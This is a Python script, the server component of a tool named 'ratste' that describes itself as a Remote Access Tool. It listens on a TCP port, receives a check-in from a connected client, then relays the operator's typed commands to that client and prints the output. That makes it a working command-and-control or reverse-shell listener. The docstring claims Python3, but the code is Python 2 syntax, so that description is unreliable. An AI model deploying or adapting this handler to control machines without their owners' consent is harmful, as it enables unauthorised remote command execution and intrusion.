#!/usr/bin/env python

""" 
ratste's server component.

ratste is a general purpose Remote Access Tool written in Python3.

This program is free software: you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation, either version 3 of the License, or (at your option) any later
version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with
this program. If not, see <http://www.gnu.org/licenses/>.
"""

__author__ = "https://github.com/StefanoRatto/"
__date__ = "2021/05/25"
__deprecated__ = False
__license__ = "GPLv3"
__version__ = "1.0.0"

import socket
import sys

try:
    LHOST = str(sys.argv[1])
    LPORT = int(sys.argv[2])
except:
    print 'Usage: ./ratste_server.py <local_ip> <local_port>'
    sys.exit(1)

def main():
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((LHOST, LPORT))
        s.listen(10)
    except:
        print 'ratste > network error, exiting...'
        sys.exit(1)

    print 'ratste > server listening on {}:{}'.format(LHOST, LPORT)
    print 'ratste > type "quit" or ctrl-c to exit'

    conn, _ = s.accept()

    conn.send('hostname')
    client = conn.recv(4096).rstrip()
    print 'ratste > check-in by {}'.format(client)

    while True:
        cmd = raw_input('ratste@{} > '.format(client)).rstrip()

        # allow noop
        if cmd == '':
            continue

        # send command to client
        conn.send(cmd)

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        data = conn.recv(4096)
        print data

if __name__ == '__main__':
    main()